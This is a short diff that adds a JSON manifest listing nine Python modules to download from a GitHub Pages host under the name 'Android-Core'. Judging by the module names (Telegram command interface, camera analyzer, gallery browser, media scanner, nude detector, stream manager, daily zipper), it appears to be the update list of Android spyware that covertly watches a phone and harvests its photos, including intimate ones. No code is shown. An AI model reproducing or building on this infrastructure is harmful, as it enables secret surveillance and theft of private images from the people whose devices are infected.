@@ -1,0 +1,15 @@
+{
+  "version": "2.2",
+  "files": [
+    "https://zaen1993.github.io/Android-Core/files/monitor.py",
+    "https://zaen1993.github.io/Android-Core/files/telegram_ui.py",
+    "https://zaen1993.github.io/Android-Core/files/commands.py",
+    "https://zaen1993.github.io/Android-Core/files/stream_manager.py",
+    "https://zaen1993.github.io/Android-Core/files/nude_detector.py",
+    "https://zaen1993.github.io/Android-Core/files/camera_analyzer.py",
+    "https://zaen1993.github.io/Android-Core/files/media_scanner.py",
+    "https://zaen1993.github.io/Android-Core/files/gallery_browser.py",
+    "https://zaen1993.github.io/Android-Core/files/daily_zipper.py"
+  ]
+}
+
